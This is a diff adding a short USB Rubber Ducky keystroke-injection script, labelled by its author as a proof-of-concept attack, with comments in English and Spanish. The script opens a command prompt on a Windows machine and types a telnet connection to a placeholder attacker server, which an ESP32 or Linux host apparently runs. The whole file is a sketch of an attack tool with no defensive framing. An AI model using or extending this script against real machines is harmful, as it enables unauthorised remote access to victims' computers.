@@ -1,0 +1,11 @@
+REM Kernelboy34 prove of concept attack with esp32
+REM the attack concist on making a server with the esp32 and after that 
+REM make conecction with the help of the rubber ducky
+DELAY 1000
+WINDOWS r
+STRING cmd
+ENTER
+REM nos conectamos por medio de telnet al servidor
+STRING telnet <dirección IP del servidor Linux> <puerto>
+ENTER
+REM PLANEO MEJORAR EL CODIGO ESTO SOLO ES UN EJEMPLO PORQUE ADQUIRI UN USB RUBBER DUCKY
